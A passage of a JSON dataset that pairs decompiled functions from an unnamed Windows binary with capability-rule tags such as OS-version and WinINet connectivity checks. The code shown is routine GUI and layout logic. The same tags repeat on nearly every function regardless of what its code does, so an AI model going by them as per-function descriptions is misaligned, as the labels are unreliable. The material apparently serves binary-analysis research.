        "decompiled_code": "\nvoid __fastcall fcn.0044679c(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    piStack28 = *(in_EAX[0x1d] + 0x14);\n    if (piStack28 == NULL) {\n        piStack28 = NULL;\n    }\n    piStack24 = *(in_EAX[0x1d] + 0x10);\n    if (piStack24 == NULL) {\n        piStack24 = NULL;\n    }\n    iStack20 = *(in_EAX[0x1d] + 0xc);\n    if (iStack20 == 0) {\n        iStack20 = 0;\n    }\n    iStack16 = *(in_EAX[0x1d] + 8);\n    if (iStack16 == 0) {\n        iStack16 = 0;\n    }\n    (**(*in_EAX + 0x38))();\n    if ((piStack28 < 1) || (*param_2 <= piStack28)) {\n        if ((0 < &iStack16) && (*param_2 < &iStack16)) {\n            *param_2 = &iStack16;\n        }\n    }\n    else {\n        *param_2 = piStack28;\n    }\n    if ((piStack24 < 1) || (*param_1 <= piStack24)) {\n        if ((0 < &iStack20) && (*param_1 < &iStack20)) {\n            *param_1 = &iStack20;\n        }\n    }\n    else {\n        *param_1 = piStack24;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "004468a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.004468a4(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = (**(*in_EAX + 0x54))();\n    if (uVar1 != '\\0') {\n        in_EAX[0x28] = in_EAX[0x13];\n        in_EAX[0x27] = in_EAX[0x12];\n        return in_EAX[0x12];\n    }\n    if (in_EAX[0x25] != 0) {\n        if ((*(in_EAX + 0x24) == '\\x02') || (*(in_EAX[0x25] + 0x5b) - 1U < 2)) {\n            uVar1 = in_EAX[0x13];\n            in_EAX[0x2a] = uVar1;\n        }\n        else if ((*(in_EAX + 0x24) == '\\x01') || (uVar1 = *(in_EAX[0x25] + 0x5b) - 5,  *(in_EAX[0x25] + 0x5b) - 3U < 2))\n        {\n            uVar1 = in_EAX[0x12];\n            in_EAX[0x29] = uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 308
    },
    "0044694c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044694c(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint lpKeyState;\n    int32_t *var_15h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    if (((((*(in_EAX + 7) & 0x10) == 0) || (*NULL = fcn.00458424(),  *NULL == NULL)) || ((*NULL)[0xa6] == 0)) ||\n       (cVar3 = (**(*(*NULL)[0xa6] + 0x24))(),  cVar3 == '\\0')) {\n        if ((*param_2 < 0x100) || (0x109 < *param_2)) {\n            uVar1 = *param_2;\n            if ((uVar1 < 0x200) || (0x20a < uVar1)) {\n                if (uVar1 == 0xb00b) {\n                    fcn.00445138(param_2[2]);\n                }\n            }\n            else {\n                if (((*(in_EAX + 0x14) & 0x80) == 0) && (((uVar1 == 0x203 || (uVar1 == 0x206)) || (uVar1 == 0x209)))) {\n                    *param_2 = *param_2 - 2;\n                }\n    // switch table (8 cases) at 0x446a25\n                switch(*param_2) {\n                case 0x200:\n                    func_0x00463248();\n                    break;\n                case 0x201:\n                case 0x203:\n                    if (*(in_EAX + 0x5d) == '\\x01') {\n                        fcn.00404154();\n                        return;\n                    }\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 1;\n                    break;\n                case 0x202:\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfffe;\n                    break;\n                default:\n                    if (((*(*0x4964f0 + 0x20) != '\\0') && (*(*0x4964f0 + 0x1c) != 0)) &&\n                       (*param_2 == *(*0x4964f0 + 0x1c))) {\n                        sub.user32.dll_GetKeyboardState(&lpKeyState);\n                        var_10h = *param_2;\n                        var_ch._0_1_ = fcn.00458324();\n                        var_ch._2_2_ = *(param_2 + 1);\n                        var_8h = param_2[2];\n                        fcn.00404154();\n                        return;\n                    }\n                    break;\n                case 0x207:\n                    if ((((*(in_EAX + 0x52) & 8) != 0) && (*0x446c18 == (*0x446c14 & *(in_EAX + 0x15)))) &&\n                       (cVar3 = fcn.00452468(),  cVar3 == '\\0')) {\n                        fcn.004523f4();\n                        var_15h._0_1_ = '\\0';\n                        piVar2 = *(*0x4964f0 + 0x28);\n                        if (piVar2 != NULL) {\n                            cVar3 = fcn.004040e4();\n                            if (cVar3 == '\\0') {\n                                if (in_EAX[0xc] == 0) {\n                                    *NULL = fcn.00458424();\n                                    if (*NULL != NULL) {\n                                        fcn.0044d1c8();\n                                        var_15h._0_1_ = (**(**(*0x4964f0 + 0x28) + 0xe0))();\n                                    }\n                                }\n                                else {\n                                    fcn.0044d1c8();\n                                    var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                                }\n                            }\n                            else {\n                                fcn.0044d1c8();\n                                var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                            }\n                        }\n                        if (var_15h == '\\0') {\n                            if (*(*0x4964f0 + 0x28) != 0) {\n                                fcn.00452534();\n                            }\n                        }\n                        else {\n                            param_2[3] = 1;\n                            fcn.004633a0();\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            *NULL = fcn.00458424();\n            if ((*NULL != NULL) && (cVar3 = (**(**NULL + 0x100))(),  cVar3 != '\\0')) {\n                return;\n            }\n        }\n        (**(*in_EAX + -0x14))();\n    }\n    return;\n}\n",
        "token_count": 1126
    },
    "00446cf8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446cf8(int32_t arg_8h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    \n    if (in_AL == '\\0') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x180))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x446f08 == (*(*(arg_8h + -8) + 0x61) & *0x446f04))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x40))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x01') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x184))) ||\n           (((*(*(arg_8h + -4) + 0x20) == 0 &&\n             ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x446f08 == (*(*(arg_8h + -8) + 0x61) & *0x446f0c))))) &&\n            (iVar1 = *(*(arg_8h + -8) + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x44))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x02') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x188))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x446f10 == (*(*(arg_8h + -8) + 0x61) & *0x446f10))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x48))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if ((in_AL == '\\x03') &&\n            (((iVar1 = *(*(arg_8h + -4) + 0x20),  iVar1 != 0 &&\n              (iVar1 = *(iVar1 + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x18c))) ||\n             (((*(*(arg_8h + -4) + 0x20) == 0 &&\n               ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x446f14 == (*(*(arg_8h + -8) + 0x61) & *0x446f14))))) &&\n              (iVar1 = *(*(arg_8h + -8) + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x4c))))))) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 897
    },
    "00447134": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00447134(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xc2) != 0) {\n        (**(in_EAX + 0xc0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "004472b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar __fastcall fcn.004472b4(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    uVar1 = *param_2;\n    uVar2 = *param_1;\n    cVar3 = fcn.004466dc();\n    if (cVar3 != '\\0') {\n        if (((*(in_EAX + 0x5c) == '\\0') || (cVar3 = fcn.00446670(),  cVar3 != '\\0')) ||\n           (cVar3 = fcn.004466dc(),  cVar3 != '\\0')) {\n            cVar4 = '\\x01';\n        }\n        else {\n            cVar4 = '\\0';\n        }\n        if (cVar4 != '\\0') {\n            *param_2 = uVar1;\n            *param_1 = uVar2;\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 236
    },
    "00447400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00447400(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        (**(in_EAX + 200))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "004474ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004474ac(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xd2) != 0) {\n        (**(in_EAX + 0xd0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00447678": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447678(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    if (*0x447724 == (*0x447720 & *(in_EAX + 7))) {\n        iVar1 = in_EAX[0x1d];\n        if ((*(iVar1 + 0xc) == 0) || (in_EAX[0x12] <= *(iVar1 + 0xc))) {\n            if ((*(iVar1 + 0x14) != 0) && (in_EAX[0x12] < *(iVar1 + 0x14))) {\n                *(iVar1 + 0x14) = in_EAX[0x12];\n            }\n        }\n        else {\n            *(iVar1 + 0xc) = in_EAX[0x12];\n        }\n        if ((*(iVar1 + 8) == 0) || (in_EAX[0x13] <= *(iVar1 + 8))) {\n            if ((*(iVar1 + 0x10) != 0) && (in_EAX[0x13] < *(iVar1 + 0x10))) {\n                *(iVar1 + 0x10) = in_EAX[0x13];\n            }\n        }\n        else {\n            *(iVar1 + 8) = in_EAX[0x13];\n        }\n        iVar1 = *(param_2 + 8);\n        if ((((iVar1 != 0) && (in_EAX[0x25] != 0)) && ((*(in_EAX + 0x55) & 4) == 0)) &&\n           ((((*(iVar1 + 0x18) & 1) == 0 && (*(iVar1 + 0x10) != 0)) && (*(iVar1 + 0x14) != 0)))) {\n            fcn.004468a4();\n        }\n    }\n    return;\n}\n",
        "token_count": 442
    },
    "00447844": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447844(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00447a8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447a8c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x54))();\n    if ((cVar1 == '\\0') || (in_EAX[0xc] == 0)) {\n        iVar2 = fcn.0044797c();\n        if (iVar2 != 0) {\n            *(*(param_2 + 8) + 8) = iVar2;\n            uVar3 = fcn.0044d1c8();\n            *(*(param_2 + 8) + 0xc) = uVar3;\n        }\n    }\n    else {\n        fcn.00447a00(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "00447aec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00447b33)\n\nvoid __fastcall fcn.00447aec(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x447bdc;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        if (param_1 != '\\0') {\n            fcn.004455ac();\n        }\n        fcn.004455dc();\n        if ((param_1 == '\\0') || (cVar1 = (**(*in_EAX + 0x50))(),  cVar1 == '\\x01')) {\n            (**(*in_EAX + 0x68))();\n        }\n        if ((param_1 == '\\0') || (in_EAX[0x21] == 0)) {\n            fcn.00404df4();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x57) == '\\x01')) {\n            fcn.004454cc();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x112) == 0)) {\n            in_EAX[0x44] = *(param_2 + 0x40);\n            in_EAX[0x45] = *(param_2 + 0x44);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x447be3;\n    uStack32 = 0x447bdb;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 435
    },
    "00447efc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00447efc(uint param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.00404154();\n    if (cVar1 != '\\0') {\n        if ((param_2 & 2) == 2) {\n            param_2 = param_2 & 0xfffffffd;\n        }\n        else if ((param_2 & 1) != 1) {\n            param_2 = param_2 | 2;\n        }\n    }\n    uVar2 = fcn.00447f3c();\n    return param_2 | uVar2;\n}\n",
        "token_count": 152
    },
    "0044811c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044811c(int32_t *arg_8h)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x44821c;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    if (in_ECX == 0) {\n        in_ECX = *(in_EAX + 0x30);\n    }\n    puVar1 = &stack0xfffffffc;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    if (in_ECX == 0) {\n        var_10h = *(in_EAX + 8);\n        var_ch._0_1_ = 0xb;\n        puVar3 = &var_10h;\n        in_stack_ffffffc8 = 0;\n        fcn.00406a50();\n        fcn.0040c5e8(in_stack_ffffffc8, puVar3);\n        fcn.004047cc();\n        puVar1 = puStack40;\n    }\n    puStack40 = puVar1;\n    *arg_8h = *var_8h;\n    arg_8h[1] = var_8h[1];\n    *arg_8h = *arg_8h + *(var_4h + 0x40);\n    arg_8h[1] = arg_8h[1] + *(var_4h + 0x44);\n    for (iVar2 = *(var_4h + 0x30); (iVar2 != 0 && (in_ECX != iVar2)); iVar2 = *(iVar2 + 0x30)) {\n        if (*(iVar2 + 0x30) != 0) {\n            *arg_8h = *arg_8h + *(iVar2 + 0x40);\n            arg_8h[1] = arg_8h[1] + *(iVar2 + 0x44);\n        }\n    }\n    if (iVar2 == 0) {\n        var_10h = *(var_4h + 8);\n        var_ch._0_1_ = 0xb;\n        puVar3 = &var_10h;\n        arg_8h_00 = 0;\n        fcn.00406a50();\n        fcn.0040c5e8(arg_8h_00, puVar3);\n        fcn.004047cc();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x448223;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 719
    },
    "004484e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004484e8(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char extraout_DL;\n    \n    piVar1 = fcn.00404324();\n    fcn.0041b7c0();\n    if (*(piVar1 + 0x77) != '\\0') {\n        *(piVar1 + 0x77) = 0;\n        fcn.00442e80();\n    }\n    fcn.00406570();\n    fcn.00403f58();\n    if (piVar1[0xc] != 0) {\n        fcn.004492d4();\n    }\n    if (piVar1[0x6d] != 0) {\n        (**(*piVar1 + 0xb4))();\n    }\n    iVar2 = fcn.00449558();\n    while (iVar2 != 0) {\n        piVar3 = fcn.0044951c();\n        fcn.00449340();\n        (**(*piVar3 + -4))();\n        iVar2 = fcn.00449558();\n    }\n    fcn.00403f58();\n    if (piVar1[0x70] != 0) {\n        fcn.0041c678();\n    }\n    fcn.00403f58();\n    fcn.004444d4();\n    if ('\\0' < extraout_DL) {\n        fcn.004042cc();\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "004485c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004485c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x1d0) == 0) {\n        return;\n    }\n    puStack28 = 0x4485ef;\n    fcn.00403f28();\n    uStack32 = 0x44868c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar3 = *(*(in_EAX + 0x1d0) + 8);\n    puStack28 = &stack0xfffffffc;\n    fcn.004150e4();\n    iVar2 = iVar3;\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar1 = fcn.00414eec();\n            if ((-1 < *(iVar1 + 0x1d4)) && (*(iVar1 + 0x1d4) < iVar3)) {\n                fcn.00415038();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar2 = fcn.00414eec();\n            if (iVar2 != 0) {\n                fcn.0044d424();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x448693;\n    uStack32 = 0x44868b;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 421
    },
    "00448744": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448744(uint arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_24h = *arg_10h;\n    uStack36 = arg_10h[1];\n    uStack32 = arg_10h[2];\n    uStack28 = arg_10h[3];\n    var_4h = in_EAX;\n    if ((arg_14h == 0) || (*(arg_14h + 0x4915e4) != *(in_EDX + 0x61))) {\n        if ((*(in_EDX + 0x175) != 0) && (*(in_EDX + 0x179) != 0)) {\n            var_8h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_ch = (**(**(in_EDX + 0x78) + 0x10))();\n            var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n            if ((*(in_EDX + 0x61) & 4) == 0) {\n                if ((*(in_EDX + 0x61) & 1) == 0) {\n                    var_24h = *(in_EDX + 0x165);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 1) == 0) {\n                var_8h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            else {\n                var_10h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            if ((*(in_EDX + 0x61) & 8) == 0) {\n                if ((*(in_EDX + 0x61) & 2) == 0) {\n                    var_24h = *(in_EDX + 0x169);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 2) == 0) {\n                var_ch = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            else {\n                var_14h = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            if (arg_8h != '\\0') {\n                if (*0x448b1c != (*0x448b18 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x16d);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n                if (*0x448b1c != (*0x448b20 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x171);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            fcn.00452c94(1, var_14h, var_10h);\n        }\n        if (arg_14h == 0) {\n            return;\n        }\n    }\n    var_10h = arg_ch[2] - *arg_ch;\n    if (((var_10h < 0) || (arg_14h - 3 < 2)) || (arg_14h == 6)) {\n        var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_14h = arg_ch[3] - arg_ch[1];\n    if (((var_14h < 0) || (arg_14h - 1 < 2)) || (arg_14h == 6)) {\n        var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_8h = *arg_ch;\n    var_ch = arg_ch[1];\n    // switch table (7 cases) at 0x4489a7\n    switch(arg_14h) {\n    case 1:\n        arg_ch[1] = arg_ch[1] + var_14h;\n        break;\n    case 2:\n        arg_ch[3] = arg_ch[3] - var_14h;\n        var_ch = arg_ch[3];\n        break;\n    case 3:\n        *arg_ch = *arg_ch + var_10h;\n        break;\n    case 4:\n        arg_ch[2] = arg_ch[2] - var_10h;\n        var_8h = arg_ch[2];\n        break;\n    case 6:\n        var_8h = *(in_EDX + 0x40);\n        var_ch = *(in_EDX + 0x44);\n        (**(*var_4h + 0xac))(&var_24h, arg_ch, &var_14h, &var_10h, &var_ch);\n    }\n    fcn.00452c94(1, var_14h, var_10h);\n    iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n    if ((iVar1 != var_10h) || (iVar1 = (**(**(in_EDX + 0x78) + 0x10))(),  iVar1 != var_14h)) {\n    // switch table (6 cases) at 0x448a6f\n        switch(arg_14h) {\n        case 1:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[1] = arg_ch[1] - (var_14h - iVar1);\n            break;\n        case 2:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n            break;\n        case 3:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            *arg_ch = *arg_ch - (var_10h - iVar1);\n            break;\n        case 4:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            break;\n        case 5:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1930
    },
    "00448cfc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
